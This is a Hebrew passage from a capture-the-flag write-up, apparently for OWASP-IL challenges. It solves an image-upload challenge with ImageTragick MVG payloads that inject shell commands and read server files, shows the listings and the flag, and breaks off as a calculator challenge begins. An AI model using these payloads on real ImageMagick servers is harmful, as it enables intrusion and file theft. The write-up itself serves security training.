dir=RTL>!
נייצר קובץ MVG זדוני לפי ההוראות,
ונעלה לאתר:
```svg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls -la>/tmp/e1.txt;")'
pop graphic-context
```
&nbsp;
האתר מסכים לקבל את
הקובץ הזה, ומציע להוריד חזרה את התוצאה בכתובת http://challenges.owaspil.ctf.today:8090/uploads/tmpdmalOL.png.
מדובר בקובץ תמונה
ריק (תמונה לבנה). למרבה המזל, אם ננסה לגשת ל-e1.txt (שיצרנו
באמצעות החולשה) מתוך תיקיית uploads, נקבל את התוכן שרצינו:
```
total 20
dr-xr-xr-x 1 root root 4096 Aug 29 13:52 .
drwxr-xr-x 1 root root 4096 Aug 29 13:52 ..
-r-xr-xr-x 1 root root 3663 Aug 27 10:40 app.py
-r-xr-xr-x 1 root root   14 Aug 27 10:40 requirements.txt
dr-xr-xr-x 1 root root 4096 Aug 29 13:52 templates
```
&nbsp;
כעת ניתן לקרוא את
הקובץ app.py, למשל, בעזרת פקודה אחרת:
```svg
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@app.py'
pop graphic-context
```
&nbsp;
התוצאה:
&nbsp;
(זוהי לא תמונת מסך,
אלא התמונה עצמה שנוצרה מתהליך ההמרה! הטקסט מוטמע בתמונה על ידי השרת. בפועל,
התמונה קטנה מדי בשביל להכיל את כל הקוד של app.py, ולכן אפשר להשתמש בשיטה הראשונה כדי לקבל את הקוד כולו כקובץ
טקסט. אולם, הדגל לא נמצא שם).
כעת ננסה לסייר בעץ
התיקיות באמצעות הפקודה הבאה:
```svg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls -alR />/tmp/e2.txt;")'
pop graphic-context
```
&nbsp;
התוצאה היא מבנה
התיקיות השלם של השרת. 
&nbsp;
למשל:
```
/:
total 1208
drwxr-xr-x   1 root root    4096 Aug 29 13:52 .
drwxr-xr-x   1 root root    4096 Aug 29 13:52 ..
-rwxr-xr-x   1 root root       0 Aug 29 13:52 .dockerenv
dr-xr-xr-x   1 root root    4096 Aug 29 13:52 app
drwxr-xr-x   1 root root    4096 Aug 29 13:45 bin
drwxr-xr-x   2 root root    4096 Jun 26 12:03 boot
drwxr-xr-x   5 root root     340 Sep  4 18:54 dev
drwxr-xr-x   1 root root    4096 Aug 29 13:52 etc
-r-xr-xr-x   1 root root      23 Aug 29 12:17 flag.txt
drwxr-xr-x   1 root root    4096 Aug 29 13:52 home
drwxr-xr-x   1 root root    4096 Aug 29 13:45 lib
drwxr-xr-x   2 root root    4096 Jul 16 00:00 lib64
drwxr-xr-x   2 root root    4096 Jul 16 00:00 media
drwxr-xr-x   2 root root    4096 Jul 16 00:00 mnt
drwxr-xr-x   2 root root    4096 Jul 16 00:00 opt
dr-xr-xr-x 305 root root       0 Sep  4 18:54 proc
drwx------   1 root root    4096 Aug 29 13:52 root
drwxr-xr-x   3 root root    4096 Jul 16 00:00 run
drwxr-xr-x   2 root root    4096 Jul 16 00:00 sbin
drwxr-xr-x   2 root root    4096 Jul 16 00:00 srv
dr-xr-xr-x  13 root root       0 Sep  5 07:14 sys
drwxrwxrwt   1 root root 1155072 Sep 24 07:59 tmp
drwxr-xr-x   1 root root    4096 Jul 16 00:00 usr
drwxr-xr-x   1 root root    4096 Jul 16 00:00 var
/app:
total 20
dr-xr-xr-x 1 root root 4096 Aug 29 13:52 .
drwxr-xr-x 1 root root 4096 Aug 29 13:52 ..
-r-xr-xr-x 1 root root 3663 Aug 27 10:40 app.py
-r-xr-xr-x 1 root root   14 Aug 27 10:40 requirements.txt
dr-xr-xr-x 1 root root 4096 Aug 29 13:52 templates
```
&nbsp;
נשתמש באחת השיטות
כדי לקרוא את flag.txt ונקבל:
OWASP-IL{Im4g3Tr4g1ck}
&nbsp;
אתגר 9 – TheBug (רמת קושי בינונית, 350 נקודות)
&nbsp;
הוראות האתגר:
I have a bug in my app that will give away the flag,
I hope you won't find it :\
What you are waiting for go away and find it...
URL: http://challenges.owaspil.ctf.today:8083/
פתרון:
האתר מציג מחשבון
שמאפשר לבצע פעולות חשבוניות בסיסיות:
הפעולות מתורגמות
לבקשות GET, למשל עבור
7+2:
http://challenges.owaspil.ctf.today:8083/?calc=7%2B2
אם ננסה לשחק עם
הפרמטרים, נקבל את התוצאה הבאה: